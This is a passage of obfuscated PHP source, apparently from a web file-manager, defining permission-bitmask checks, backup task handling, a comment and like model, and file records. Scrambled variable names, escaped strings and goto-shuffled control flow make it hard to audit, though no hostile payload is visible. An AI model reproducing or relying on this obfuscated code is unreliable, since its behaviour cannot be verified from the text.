$eæ·éì®ƒ¥[1625] => 6, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1638]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1639], $eæ·éì®ƒ¥[1625] => 7, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => 0)); return $F¬Œ˜´Ÿ³÷; } public static function authCheck($eŸÂ•Ì»ç, $aÔÆôí„¦ù) { $eŸÂ•Ì»ç = intval($eŸÂ•Ì»ç); if (_get($GLOBALS, $_SERVER[±á õÁ][482])) { return !0; } if ($eŸÂ•Ì»ç <= 0) { return !1; } if (($eŸÂ•Ì»ç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eŸÂ•Ì»ç & $aÔÆôí„¦ù); } public static function authCheckShow($fÉƒˆĞµ³î) { return self::authCheck($fÉƒˆĞµ³î, self::AUTH_SHOW); } public static function authCheckView($A«—ãğ‚î) { return self::authCheck($A«—ãğ‚î, self::AUTH_VIEW); } public static function authCheckDownload($d¼¬ƒ’„°) { return self::authCheck($d¼¬ƒ’„°, self::AUTH_DOWNLOAD); } public static function authCheckUpload($AŞªÎÓ±) { return self::authCheck($AŞªÎÓ±, self::AUTH_UPLOAD); } public static function authCheckEdit($EÆ›¼ƒ¥æõ) { return self::authCheck($EÆ›¼ƒ¥æõ, self::AUTH_EDIT); } public static function authCheckRemove($b¸”Ã¬³¬) { return self::authCheck($b¸”Ã¬³¬, self::AUTH_REMOVE); } public static function authCheckShare($Eï‹±¤ªñê) { return self::authCheck($Eï‹±¤ªñê, self::AUTH_SHARE); } public static function authCheckComment($Bßé••«¬æ) { return self::authCheck($Bßé••«¬æ, self::AUTH_COMMENT); } public static function authCheckEvent($fİÀèÂ´Ğ) { return self::authCheck($fİÀèÂ´Ğ, self::AUTH_EVENT); } public static function authCheckRoot($FØ´ì ×Ğ) { return self::authCheck($FØ´ì ×Ğ, self::AUTH_ROOT); } public static function authCheckAction($Bª¥˜Ç²£, $EÂß·¶¯ƒĞ) { goto EÓÈ´¶œ©õ; C¸…Ú©¾„ƒ: $F¨Êš‘ëÁ = $aĞ¹ãóèõ[$EÂß·¶¯ƒĞ]; $Bª¥˜Ç²£ = intval($Bª¥˜Ç²£); if ($Bª¥˜Ç²£ <= 0) { return !1; } goto cÛ´ã„¬; EÓÈ´¶œ©õ: $Eé„Úƒ¸›ƒ =& $_SERVER[±á õÁ]; $aĞ¹ãóèõ = array($Eé„Úƒ¸›ƒ[1640] => self::AUTH_VIEW, $Eé„Úƒ¸›ƒ[1062] => self::AUTH_DOWNLOAD, $Eé„Úƒ¸›ƒ[113] => self::AUTH_UPLOAD, $Eé„Úƒ¸›ƒ[1588] => self::AUTH_EDIT, $Eé„Úƒ¸›ƒ[1587] => self::AUTH_REMOVE, $Eé„Úƒ¸›ƒ[1598] => self::AUTH_SHARE, $Eé„Úƒ¸›ƒ[357] => self::AUTH_COMMENT, $Eé„Úƒ¸›ƒ[1452] => self::AUTH_EVENT, $Eé„Úƒ¸›ƒ[1641] => self::AUTH_ROOT); if (!isset($aĞ¹ãóèõ[$EÂß·¶¯ƒĞ])) { return; } goto C¸…Ú©¾„ƒ; cÛ´ã„¬: if (($Bª¥˜Ç²£ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Bª¥˜Ç²£ & $F¨Êš‘ëÁ); goto d®î§Ã„é…; d®î§Ã„é…: } public static function authDisable($d¤È‡©ï±ï, $fÀ°ëâæ´é) { if (intval($d¤È‡©ï±ï) <= 0) { return 0; } return intval($d¤È‡©ï±ï) & ~$fÀ°ëâæ´é; } public $optionType = "\123\x79\x73\x74\x65\155\x2e\163\157\165\162\143\x65\101\165\x74\x68\114\151\x73\x74"; public $field = array("\156\141\155\145", "\141\x75\164\x68", "\154\x61\142\145\x6c", "\144\151\163\x70\x6c\141\171", "\x73\x79\163\x74\145\155", "\x73\x6f\162\x74"); public function initData() { $cèŠÙŒ¦ñ“ = $this->authDefault(); foreach ($cèŠÙŒ¦ñ“ as $Aã‘ñğã°÷) { $this->add($Aã‘ñğã°÷); } } public function listData($D¹ˆÖŞ”ÑÎ = false, $f¶³§Òµ˜å = "\163\157\x72\x74", $d”°İî´Ñô = false) { return parent::listData($D¹ˆÖŞ”ÑÎ, $f¶³§Òµ˜å, $d”°İî´Ñô); } public function update($cç¡ˆÔã˜š, $c›÷‘íò‰«) { $CÒŞÇŠšÌ– =& $_SERVER[±á õÁ]; $AÌØŒ‚„¢ƒ = parent::listData($cç¡ˆÔã˜š); $a¶Öéì´Ã = $this->findByName($c›÷‘íò‰«[$CÒŞÇŠšÌ–[38]]); if (!$AÌØŒ‚„¢ƒ || $a¶Öéì´Ã && $a¶Öéì´Ã[$CÒŞÇŠšÌ–[391]] != $AÌØŒ‚„¢ƒ[$CÒŞÇŠšÌ–[391]]) { return !1; } $this->filterAuth($c›÷‘íò‰«[$CÒŞÇŠšÌ–[400]]); return parent::update($cç¡ˆÔã˜š, $c›÷‘íò‰«); } public function remove($CêéŠßâ¦) { $fàŠ­°„°Ï = parent::listData($CêéŠßâ¦); if (!$fàŠ­°„°Ï || $fàŠ­°„°Ï[$_SERVER[±á õÁ][1101]]) { return !1; } return parent::remove($CêéŠßâ¦); } public function add($a¶œ‰âƒ÷ = array()) { goto bêÖÒŒÕù; d´‡ÃÒİ¿: $a¶œ‰âƒ÷ = array_merge($B¡Éøœä÷÷, $a¶œ‰âƒ÷); $a¶œ‰âƒ÷[$F‰Ï¹£»Í“[1644]] = $this->getSort(); $this->filterAuth($a¶œ‰âƒ÷[$F‰Ï¹£»Í“[400]]); goto dÎãŠ¦µğ«; dÎãŠ¦µğ«: return parent::insert($a¶œ‰âƒ÷); goto Aã¡ˆ¹‡îÏ; bêÖÒŒÕù: $F‰Ï¹£»Í“ =& $_SERVER[±á õÁ]; if ($this->findByName($a¶œ‰âƒ÷[$F‰Ï¹£»Í“[38]])) { return !1; } $B¡Éøœä÷÷ = array($F‰Ï¹£»Í“[38] => $F‰Ï¹£»Í“[43], $F‰Ï¹£»Í“[400] => 1, $F‰Ï¹£»Í“[1642] => $F‰Ï¹£»Í“[1631], $F‰Ï¹£»Í“[1643] => 1, $F‰Ï¹£»Í“[1101] => 0, $F‰Ï¹£»Í“[1644] => 0); goto d´‡ÃÒİ¿; Aã¡ˆ¹‡îÏ: } private function getSort() { $e°”†ôë÷½ =& $_SERVER[±á õÁ]; $eÔÜŠå» = parent::listData(); $C…ÄÇ•Š = array_to_keyvalue($eÔÜŠå», $e°”†ôë÷½[43], $e°”†ôë÷½[1644]); return empty($C…ÄÇ•Š) ? 0 : max($C…ÄÇ•Š) + 1; } private function filterAuth(&$D™ğñ´Ï™) { goto FÂ“•¾´‰Î; E‹ÕÚÁ§‹î: foreach ($A³„”íÂŸ as $Fù…©¤±…) { if (isset($EÙÏ…–³Ñé[$Fù…©¤±…])) { $A³„”íÂŸ = array_merge($A³„”íÂŸ, $EÙÏ…–³Ñé[$Fù…©¤±…]); } } $A³„”íÂŸ[] = self::AUTH_SHOW; $D™ğñ´Ï™ = array_sum(array_unique($A³„”íÂŸ)); goto FàÓ—ÕáÆÃ; C”¾ô¹Ÿù¤: foreach ($e§î£ªŠö as $Fù…©¤±…) { if ($D™ğñ´Ï™ & $Fù…©¤±…) { $A³„”íÂŸ[] = $Fù…©¤±…; } } if (in_array(self::AUTH_ROOT, $A³„”íÂŸ)) { $D™ğñ´Ï™ = array_sum($e§î£ªŠö); return; } $EÙÏ…–³Ñé = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto E‹ÕÚÁ§‹î; FÂ“•¾´‰Î: if (!$D™ğñ´Ï™) { return; } $e§î£ªŠö = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A³„”íÂŸ = array(); goto C”¾ô¹Ÿù¤; FàÓ—ÕáÆÃ: } public function sort($C¿ô‘‹”Š¾, $B¤ÁŞ”·í×) { return parent::update($C¿ô‘‹”Š¾, $B¤ÁŞ”·í×); } } goto f÷Å§‰Ï‚; f÷Å§‰Ï‚: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\142\141\x63\x6b\165\160\x4c\x69\x73\164"; public $field = array("\151\157", "\156\141\x6d\x65", "\163\164\x61\164\165\x73", "\x63\x6f\156\164\145\x6e\x74", "\162\145\163\x75\x6c\x74", "\x74\151\x6d\145\x46\162\x6f\155", "\x74\x69\x6d\x65\x54\157"); public function config() { goto e«¸£ê“ë÷; cö¥¥©‹: $b‡ãªà¦Ç¿ = is_array($b‡ãªà¦Ç¿) ? $b‡ãªà¦Ç¿ : array(); if (!isset($b‡ãªà¦Ç¿[$a£…ÉŞÚ‘[717]])) { $b‡ãªà¦Ç¿[$a£…ÉŞÚ‘[717]] = $a£…ÉŞÚ‘[93]; } $b¡éÎ”ÒÌ = array(); goto CÀ×ƒÌ»¨‘; e«¸£ê“ë÷: $a£…ÉŞÚ‘ =& $_SERVER[±á õÁ]; $b‡ãªà¦Ç¿ = Model($a£…ÉŞÚ‘[1109])->get($a£…ÉŞÚ‘[738]); $b‡ãªà¦Ç¿ = json_decode($b‡ãªà¦Ç¿, !0); goto cö¥¥©‹; CÀ×ƒÌ»¨‘: Action($a£…ÉŞÚ‘[1645])->taskInit(); $f¹³¯Ôèˆ÷ = Model($a£…ÉŞÚ‘[1646])->listData(); foreach ($f¹³¯Ôèˆ÷ as $Fõ„Ôà¹¯É) { if ($Fõ„Ôà¹¯É[$a£…ÉŞÚ‘[1101]] == $a£…ÉŞÚ‘[93] && $Fõ„Ôà¹¯É[$a£…ÉŞÚ‘[1452]] == $a£…ÉŞÚ‘[1647]) { $b¡éÎ”ÒÌ = $Fõ„Ôà¹¯É; break; } } goto bøêÉ¢³Š; bøêÉ¢³Š: if (isset($b¡éÎ”ÒÌ[$a£…ÉŞÚ‘[203]])) { $b¡éÎ”ÒÌ[$a£…ÉŞÚ‘[203]] = json_decode($b¡éÎ”ÒÌ[$a£…ÉŞÚ‘[203]], !0); } if (isset($b‡ãªà¦Ç¿[$a£…ÉŞÚ‘[203]])) { $b¡éÎ”ÒÌ[$a£…ÉŞÚ‘[203]][$a£…ÉŞÚ‘[1437]] = $b‡ãªà¦Ç¿[$a£…ÉŞÚ‘[203]]; unset($b‡ãªà¦Ç¿[$a£…ÉŞÚ‘[203]]); } return array_merge($b¡éÎ”ÒÌ, $b‡ãªà¦Ç¿); goto e’áäš×‘â; e’áäš×‘â: } public function listData($a‰èâ³æÜî = false, $E±“»İÇö¹ = "\x6d\x6f\x64\x69\146\x79\124\151\155\145", $däŠ·“âœ™ = false) { return parent::listData($a‰èâ³æÜî, $E±“»İÇö¹, !0); } public function lastItem() { $e¦‹¬º = $this->listData(); return !empty($e¦‹¬º[0]) ? $e¦‹¬º[0] : null; } public function kill($d‰‰•±¥õ½) { goto Eš•ŠÃøÈ‰; Eš•ŠÃøÈ‰: $dÄğé¦³… =& $_SERVER[±á õÁ]; $aøÂÌœ©¦Œ = $this->listData($d‰‰•±¥õ½); if (!$aøÂÌœ©¦Œ || empty($aøÂÌœ©¦Œ[$dÄğé¦³…[38]])) { return !0; } goto AÀ§Éñ½ËÉ; C³ô»……Í¾: return $this->remove($d‰‰•±¥õ½); goto e²ØÊ†ç¦¥; AÀ§Éñ½ËÉ: Task::kill($dÄğé¦³…[737]); Task::kill($dÄğé¦³…[753]); Task::kill($dÄğé¦³…[761]); goto B—åàœÍˆ; B—åàœÍˆ: $cÊÒƒÕ Êñ = $aøÂÌœ©¦Œ[$dÄğé¦³…[38]]; $E‰É§éÎˆÀ = TEMP_FILES . $dÄğé¦³…[734] . $cÊÒƒÕ Êñ . $dÄğé¦³…[8]; IO::remove($E‰É§éÎˆÀ, !1); goto C³ô»……Í¾; e²ØÊ†ç¦¥: } public function remove($E¾–ŠÇù°) { $E•à“ ÷Æ‘ = $this->listData($E¾–ŠÇù°); if (!$E•à“ ÷Æ‘) { return !0; } return $this->backupRemove($E•à“ ÷Æ‘); } private function backupRemove($D ¼Çâô×) { $còï’™ĞÓ =& $_SERVER[±á õÁ]; parent::remove($D ¼Çâô×[$còï’™ĞÓ[391]]); $c ¦È‰ÙÑ = "\x7b\151\x6f\72{$D ¼Çâô×[$còï’™ĞÓ[716]]}\x7d\57\144\x61\164\141\142\141\x73\x65\x2f\142\x61\x63\153\165\x70\137" . $D ¼Çâô×[$còï’™ĞÓ[38]]; IO::remove($c ¦È‰ÙÑ, !1); return !0; } public function start() { goto D™ÇÁÙ†çÚ; aÆÎ¹‘¡”¨: if (!$E“×ÀØÂÆ || $E“×ÀØÂÆ[$D…§ÉÓª©›[1434]] != $D…§ÉÓª©›[93]) { return !1; } $B¡Ãàœ®ØÃ = $this->process(); foreach ($B¡Ãàœ®ØÃ as $fÉõ†éšÌ) { if ($fÉõ†éšÌ) { return Task::restart($fÉõ†éšÌ[$D…§ÉÓª©›[391]]); } } goto AŠ†ŸÛ¯šó; aÆôãğ•ËÔ: return !0; goto d÷´…¾óÈØ; FÀÌâÕ‡ç: if (!$E±Æ£ÏØŠ->dbFile()) { return !1; } if ($E“×ÀØÂÆ[$D…§ÉÓª©›[717]] == $D…§ÉÓª©›[493]) { $E±Æ£ÏØŠ->file(); } Backup::set(array($D…§ÉÓª©›[714] => 1, $D…§ÉÓª©›[472] => time())); goto aÆôãğ•ËÔ; AŠ†ŸÛ¯šó: $E±Æ£ÏØŠ = new Backup(); $E±Æ£ÏØŠ->keep(); if (!$E±Æ£ÏØŠ->db()) { return !1; } goto FÀÌâÕ‡ç; D™ÇÁÙ†çÚ: $D…§ÉÓª©› =& $_SERVER[±á õÁ]; if ($GLOBALS[$D…§ÉÓª©›[6]][$D…§ÉÓª©›[94]][$D…§ÉÓª©›[1648]] != $D…§ÉÓª©›[93]) { return !0; } $E“×ÀØÂÆ = $this->config(); goto aÆÎ¹‘¡”¨; d÷´…¾óÈØ: } public function process() { $E‰¾¡ÉÇ– =& $_SERVER[±á õÁ]; return array($E‰¾¡ÉÇ–[719] => Task::get($E‰¾¡ÉÇ–[737]), $E‰¾¡ÉÇ–[722] => Task::get($E‰¾¡ÉÇ–[753]), $E‰¾¡ÉÇ–[181] => Task::get($E‰¾¡ÉÇ–[761])); } public function restore() { $FãÍƒ¢ñ¡ =& $_SERVER[±á õÁ]; ActionCall($FãÍƒ¢ñ¡[991], !0, 1); ActionCall($FãÍƒ¢ñ¡[991], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\x6e\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\x65" => "\143\157\x6d\x6d\145\x6e\x74\x5f\155\x65\164\x61", "\155\x65\x74\x61\106\151\145\x6c\144" => "\143\157\x6d\x6d\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($CØ’Ë¹È¤) { $e‘ÈáŠ›º =& $_SERVER[±á õÁ]; if ($CØ’Ë¹È¤[$e‘ÈáŠ›º[1649]]) { $dæĞö¾ óİ = $this->where(array($e‘ÈáŠ›º[1650] => $CØ’Ë¹È¤[$e‘ÈáŠ›º[1649]]))->find(); if (!$dæĞö¾ óİ || $dæĞö¾ óİ[$e‘ÈáŠ›º[395]] != $CØ’Ë¹È¤[$e‘ÈáŠ›º[395]] || $dæĞö¾ óİ[$e‘ÈáŠ›º[481]] != $CØ’Ë¹È¤[$e‘ÈáŠ›º[481]]) { return !1; } $this->where(array($e‘ÈáŠ›º[1650] => $CØ’Ë¹È¤[$e‘ÈáŠ›º[1649]]))->setAdd($e‘ÈáŠ›º[1651], 1); } $CØ’Ë¹È¤[$e‘ÈáŠ›º[1652]] = 0; $CØ’Ë¹È¤[$e‘ÈáŠ›º[1651]] = 0; $CØ’Ë¹È¤[$e‘ÈáŠ›º[714]] = 1; return $this->add($CØ’Ë¹È¤); } public function remove($bœĞõ’ŒÔ„) { $cªãÒã­Œï =& $_SERVER[±á õÁ]; $B“†»½ˆ§ = array($cªãÒã­Œï[1650] => $bœĞõ’ŒÔ„); $B±«¹ñŒŸ’ = $this->where($B“†»½ˆ§)->find(); if ($B±«¹ñŒŸ’[$cªãÒã­Œï[1649]]) { $this->where(array($cªãÒã­Œï[1650] => $B±«¹ñŒŸ’[$cªãÒã­Œï[1649]]))->setAdd($cªãÒã­Œï[1651], -1); } return $this->where($B“†»½ˆ§)->delete(); } public function edit($aÉ­›ÃÉ®ç, $AŠÆ…öèÙ‰) { $f½İ¬´ã‡Œ =& $_SERVER[±á õÁ]; $FÓğ´ôŞ£ = array($f½İ¬´ã‡Œ[1650] => $aÉ­›ÃÉ®ç); return $this->where($FÓğ´ôŞ£)->save(array($f½İ¬´ã‡Œ[1653] => $AŠÆ…öèÙ‰)); } public function prasise($FÕÓÈ‘•¾í) { $Bß”ÖëĞÂœ =& $_SERVER[±á õÁ]; $Cš—«ˆËµ = Model($Bß”ÖëĞÂœ[1654]); $A’ß³ï¡à = array($Bß”ÖëĞÂœ[1650] => $FÕÓÈ‘•¾í, $Bß”ÖëĞÂœ[1455] => USER_ID); $Cš–ïÕŸ¯¤ = $Cš—«ˆËµ->where($A’ß³ï¡à)->find(); if (!$Cš–ïÕŸ¯¤) { $Cš—«ˆËµ->add($A’ß³ï¡à); $C‹À‚„‡‰§ = $this->where(array($Bß”ÖëĞÂœ[1650] => $FÕÓÈ‘•¾í))->setAdd($Bß”ÖëĞÂœ[1652], 1); } else { $Cš—«ˆËµ->where($A’ß³ï¡à)->delete(); $C‹À‚„‡‰§ = $this->where(array($Bß”ÖëĞÂœ[1650] => $FÕÓÈ‘•¾í))->setAdd($Bß”ÖëĞÂœ[1652], -1); } return $C‹À‚„‡‰§; } public function targetInfo($eãêù¬õÛâ, $FÓ…‘Ø½æ) { goto d›è£¡é†ù; bÔ—êïæÄ: return $Bä¢Ö²øĞè; goto eÊÁ‡Ö´„˜; CÖÇê‰‚œ: $c–Ÿè‰­æô = "\122\111\x47\110\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\x6e\x74\137\x70\162\x61\151\x73\145\40\163\164\141\162\40\x6f\x6e\x20\x63\157\x6d\155\x65\x6e\x74\56\x63\157\155\x6d\x65\156\x74\111\x44\x20\75\40\x73\x74\x61\162\56\x63\157\x6d\x6d\x65\x6e\x74\x49\x44"; $A§Û¨ê©«² = $this->alias($Fºİ¬óà”ñ[357])->where($A‹²­Í¤ò)->join($c–Ÿè‰­æô, $Fºİ¬óà”ñ[1655])->count(); $Bä¢Ö²øĞè = array($Fºİ¬óà”ñ[1656] => $Fîóˆ½½ò¶, $Fºİ¬óà”ñ[1657] => $A§Û¨ê©«²); goto bÔ—êïæÄ; d›è£¡é†ù: $Fºİ¬óà”ñ =& $_SERVER[±á õÁ]; $A‹²­Í¤ò = array($Fºİ¬óà”ñ[546] => $eãêù¬õÛâ, $Fºİ¬óà”ñ[547] => $FÓ…‘Ø½æ); $Fîóˆ½½ò¶ = $this->where($A‹²­Í¤ò)->count(); goto CÖÇê‰‚œ; eÊÁ‡Ö´„˜: } public function listData($BŒ†°àÔ¡ç) { $A©¾º«ĞËà =& $_SERVER[±á õÁ]; if (isset($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1658]])) { if ($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1658]]) { $BŒ†°àÔ¡ç[$A©¾º«ĞËà[1659]] = array($A©¾º«ĞËà[944], intval($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1658]])); } unset($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1658]]); } if (isset($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1660]])) { if ($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1660]]) { $BŒ†°àÔ¡ç[$A©¾º«ĞËà[1659]] = array($A©¾º«ĞËà[941], intval($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1660]])); } unset($BŒ†°àÔ¡ç[$A©¾º«ĞËà[1660]]); } return $this->_listData($BŒ†°àÔ¡ç); } private function _listData($D©á¦™åÏ») { $aìâ–Âë»ô =& $_SERVER[±á õÁ]; $C¡¬ÅÖ ÒÙ = $this->where($D©á¦™åÏ»)->_makeOrder()->selectPage(100); $this->_listAppendParent($C¡¬ÅÖ ÒÙ[$aìâ–Âë»ô[370]]); $this->_listAppendUser($C¡¬ÅÖ ÒÙ[$aìâ–Âë»ô[370]]); $this->_listAppendMeta($C¡¬ÅÖ ÒÙ[$aìâ–Âë»ô[370]]); return $C¡¬ÅÖ ÒÙ; } private function _makeOrder() { $aÆßõŞ›½£ =& $_SERVER[±á õÁ]; $Aˆ®‹Ä³ = array($aÆßõŞ›½£[1652], $aÆßõŞ›½£[1651], $aÆßõŞ›½£[200]); $cÙŒøá‰« = Input::get($aÆßõŞ›½£[431], $aÆßõŞ›½£[7], $aÆßõŞ›½£[413], $Aˆ®‹Ä³); $EÂí’Õêí = Input::get($aÆßõŞ›½£[432], $aÆßõŞ›½£[7], $aÆßõŞ›½£[1457], array($aÆßõŞ›½£[1661], $aÆßõŞ›½£[429])); $E–İ…†Ëäš = $cÙŒøá‰« . $aÆßõŞ›½£[60] . $EÂí’Õêí; return $this->order($E–İ…†Ëäš); } private function _listAppendParent(&$A…íÒŠŠ© ) { goto A‘ë‘’ÑÂ; aÊ­ˆàêğÆ: foreach ($A…íÒŠŠ©  as &$EÖñÇíò) { if (isset($eçÃ›¡°[$EÖñÇíò[$dèñä™‰ãˆ[1649]]])) { $EÖñÇíò[$dèñä™‰ãˆ[1662]] = $eçÃ›¡°[$EÖñÇíò[$dèñä™‰ãˆ[1649]]]; } } unset($EÖñÇíò); goto e–ìƒ´Ë›é; c˜ïöÁØ–ø: if (!$cà¨­´‰Îç) { return; } $eçÃ›¡° = $this->where(array($dèñä™‰ãˆ[1650] => array($dèñä™‰ãˆ[7], $cà¨­´‰Îç)))->select(); $eçÃ›¡° = array_to_keyvalue($eçÃ›¡°, $dèñä™‰ãˆ[1659]); goto aÊ­ˆàêğÆ; A‘ë‘’ÑÂ: $dèñä™‰ãˆ =& $_SERVER[±á õÁ]; $cà¨­´‰Îç = array_unique(array_to_keyvalue($A…íÒŠŠ© , $dèñä™‰ãˆ[43], $dèñä™‰ãˆ[1649])); $cà¨­´‰Îç = array_remove_value($cà¨­´‰Îç, $dèñä™‰ãˆ[493]); goto c˜ïöÁØ–ø; e–ìƒ´Ë›é: } private function _listAppendUser(&$DÔ…‚ß§êî) { goto f­·œØí´×; eíÃ ¿¼¦Ğ: if (count($f’¸îè³ìÔ) == 0) { return; } foreach ($DÔ…‚ß§êî as $e÷§Ë‡Öå») { if (isset($e÷§Ë‡Öå»[$Fá‹«®Ó»×[1662]])) { $f’¸îè³ìÔ[] = $e÷§Ë‡Öå»[$Fá‹«®Ó»×[1662]][$Fá‹«®Ó»×[1463]]; } } $B“ÁÑ»¦ëù = Model($Fá‹«®Ó»×[502])->userListInfo($f’¸îè³ìÔ); goto C‰Í²ãÚì‘; C‰Í²ãÚì‘: foreach ($DÔ…‚ß§êî as &$e÷§Ë‡Öå») { $e÷§Ë‡Öå»[$Fá‹«®Ó»×[559]] = $B“ÁÑ»¦ëù[$e÷§Ë‡Öå»[$Fá‹«®Ó»×[1463]]]; if (isset($e÷§Ë‡Öå»[$Fá‹«®Ó»×[1662]])) { $e÷§Ë‡Öå»[$Fá‹«®Ó»×[1662]][$Fá‹«®Ó»×[559]] = $B“ÁÑ»¦ëù[$e÷§Ë‡Öå»[$Fá‹«®Ó»×[1662]][$Fá‹«®Ó»×[1463]]]; } } unset($e÷§Ë‡Öå»); goto bÖ¯ÒÁğˆ‰; f­·œØí´×: $Fá‹«®Ó»× =& $_SERVER[±á õÁ]; $f’¸îè³ìÔ = array_unique(array_to_keyvalue($DÔ…‚ß§êî, $Fá‹«®Ó»×[43], $Fá‹«®Ó»×[1463])); $f’¸îè³ìÔ = array_remove_value($f’¸îè³ìÔ, $Fá‹«®Ó»×[493]); goto eíÃ ¿¼¦Ğ; bÖ¯ÒÁğˆ‰: } private function _listAppendMeta(&$F¢ÃÍÛç†™) { goto d©ñˆñòÅÍ; Aèª‚é¹Úµ: if (!$AøÄ™Õìå¤) { return; } foreach ($F¢ÃÍÛç†™ as $Fé«ï°Óá) { if (isset($Fé«ï°Óá[$EŞ¦ôÀÖ£[1662]])) { $AøÄ™Õìå¤[] = $Fé«ï°Óá[$EŞ¦ôÀÖ£[1662]][$EŞ¦ôÀÖ£[1659]]; } } $AİÅÓìç¯ = $this->metaList($AøÄ™Õìå¤); goto cºÏ—Ñ“Ó; cºÏ—Ñ“Ó: if (!$AİÅÓìç¯) { return !1; } foreach ($F¢ÃÍÛç†™ as &$Fé«ï°Óá) { $Fé«ï°Óá[$EŞ¦ôÀÖ£[441]] = $AİÅÓìç¯[$Fé«ï°Óá[$EŞ¦ôÀÖ£[1659]]]; if (isset($Fé«ï°Óá[$EŞ¦ôÀÖ£[1662]])) { $Fé«ï°Óá[$EŞ¦ôÀÖ£[1662]][$EŞ¦ôÀÖ£[441]] = $AİÅÓìç¯[$Fé«ï°Óá[$EŞ¦ôÀÖ£[1662]][$EŞ¦ôÀÖ£[1659]]]; } } unset($Fé«ï°Óá); goto F‡òËãÄã; d©ñˆñòÅÍ: $EŞ¦ôÀÖ£ =& $_SERVER[±á õÁ]; $AøÄ™Õìå¤ = array_unique(array_to_keyvalue($F¢ÃÍÛç†™, $EŞ¦ôÀÖ£[43], $EŞ¦ôÀÖ£[1659])); $AøÄ™Õìå¤ = array_remove_value($AøÄ™Õìå¤, $EŞ¦ôÀÖ£[493]); goto Aèª‚é¹Úµ; F‡òËãÄã: } private function metaList($bÛ¬Áí¦Ò¿) { goto fª«ÖÈÉÚ; E™ÃóíÔÀ: $aÏêÊã¤ã = Model($cÚÓà±òÄ‰[1663])->where($f„±ªÕ¡ ñ)->select(); $aÏêÊã¤ã = array_to_keyvalue_group($aÏêÊã¤ã, $cÚÓà±òÄ‰[1659]); foreach ($aÏêÊã¤ã as $aÀĞ¡ùäî• => $aÂ–ËÄŒôÄ) { $c¡‘ñ¢ÖõÃ = array(); foreach ($aÂ–ËÄŒôÄ as $bãˆÔøìº ) { $c¡‘ñ¢ÖõÃ[$bãˆÔøìº [$cÚÓà±òÄ‰[99]]] = $bãˆÔøìº [$cÚÓà±òÄ‰[375]]; } $aÏêÊã¤ã[$aÀĞ¡ùäî•] = $c¡‘ñ¢ÖõÃ; } goto Eªœì‰Ê£; fª«ÖÈÉÚ: $cÚÓà±òÄ‰ =& $_SERVER[±á õÁ]; if (!$bÛ¬Áí¦Ò¿) { return array(); } $f„±ªÕ¡ ñ = array($cÚÓà±òÄ‰[1659] => array($cÚÓà±òÄ‰[7], $bÛ¬Áí¦Ò¿)); goto E™ÃóíÔÀ; Eªœì‰Ê£: return $aÏêÊã¤ã ? $aÏêÊã¤ã : array(); goto f‰‘ šƒç; f‰‘ šƒç: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\x65" => "\x69\157\x5f\x66\151\x6c\145\137\155\145\x74\x61", "\155\145\164\x61\x46\151\145\x6c\144" => "\x66\x69\x6c\145\111\x44"); public function fileInfo($Fâ…Ã‹—ìğ) { $eÇ„ŠÑŠ‘ =& $_SERVER[±á õÁ]; static $d¾‘¤Şë£Î = array(); if (!isset($d¾‘¤Şë£Î[$Fâ…Ã‹—ìğ])) { $fÕ®Ú¶Îº£ = $eÇ„ŠÑŠ‘[1664]; $eë®ÁÍ×Ç“ = Model($eÇ„ŠÑŠ‘[446])->field($fÕ®Ú¶Îº£)->where(array($eÇ„ŠÑŠ‘[444] => $Fâ…Ã‹—ìğ))->find(); $d¾‘¤Şë£Î[$Fâ…Ã‹—ìğ] = $eë®ÁÍ×Ç“; } return $d¾‘¤Şë£Î[$Fâ…Ã‹—ìğ]; } public function addFileByContent($Bæ¿•§À« = '', $eÚùİ¢¡±’ = '') { goto FÈÛĞÁŒ; FÈÛĞÁŒ: $D¢½ˆô¥¨ =& $_SERVER[±á õÁ]; $Fó†à³Í = TEMP_PATH . $D¢½ˆô¥¨[1665]; if (!is_dir($Fó†à³Í)) { mk_dir($Fó†à³Í); } goto dŒŒæİ“£; dŒŒæİ“£: $d–°…‚·Ó = $Fó†à³Í . $D¢½ˆô¥¨[1666] . rand_string(16); file_put_contents($d–°…‚·Ó, $Bæ¿•§À«); $fàöÓÌ„Åó = $this->addFile($d–°…‚·Ó, $eÚùİ¢¡±’, !0); goto d³®„Ë½Ú; d³®„Ë½Ú: if (file_exists($d–°…‚·Ó)) { 